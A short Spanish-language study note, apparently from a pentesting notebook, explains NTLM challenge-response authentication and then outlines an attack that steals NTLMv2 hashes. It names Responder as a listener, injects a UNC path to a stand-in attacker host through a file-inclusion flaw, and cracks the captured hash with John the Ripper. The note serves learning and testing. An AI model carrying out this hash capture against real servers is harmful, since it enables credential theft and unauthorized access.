# Protocolo NTLM y Robo de Hash

**Etiquetas:** #windows #ntlm #protocolo #lfi #responder

---

## 1. ¿Qué es NTLM? (Teoría)
**NTLM (New Technology LAN Manager)** es un protocolo de autenticación propiedad de Microsoft utilizado en redes Windows. Su función es autenticar usuarios sin enviar la contraseña en texto plano por la red.

### Funcionamiento: Challenge-Response (Desafío-Respuesta)
En lugar de enviar la clave, el sistema prueba su identidad demostrando que *conoce* la clave mediante un desafío matemático.

1. **Negociación:** El cliente solicita acceso al servidor.
2. **Desafío (Challenge):** El servidor envía un número aleatorio llamado **Nonce**.
3. **Respuesta (Response):** El cliente cifra ese Nonce usando el hash de su contraseña y lo envía de vuelta.
4. **Verificación:** El servidor comprueba si el cifrado es correcto.



### Versiones
* **NTLMv1:** Obsoleto y muy inseguro.
* **NTLMv2:** Estándar actual (más robusto, pero crackeable por diccionario).

---

## 2. Ataque Práctico: Robo de Hash vía LFI
**Concepto:**
Aprovechamos una vulnerabilidad de inclusión de archivos (LFI) en un servidor web Windows para forzar una conexión saliente (autenticación) hacia nuestra máquina atacante.

**Mecanismo del Ataque:**
1. **Atacante (Listener):** Levantamos la herramienta **Responder** (`sudo responder -I tun0`) para escuchar peticiones SMB y simular ser un servidor de archivos.
2. **Víctima (Trigger):** Inyectamos una ruta UNC (`\\IP_ATACANTE\recurso`) aprovechando la vulnerabilidad LFI de la web.
3. **Autenticación Automática:** El servidor Windows víctima intenta conectarse a nuestro recurso compartido falso y, por "cortesía" del protocolo SMB, envía automáticamente el **Hash NTLMv2** del usuario que corre el servicio.
4. **Captura y Cracking:** Responder captura ese hash. Posteriormente, usamos **John the Ripper** para romperlo (fuerza bruta/diccionario) y obtener la contraseña en texto plano.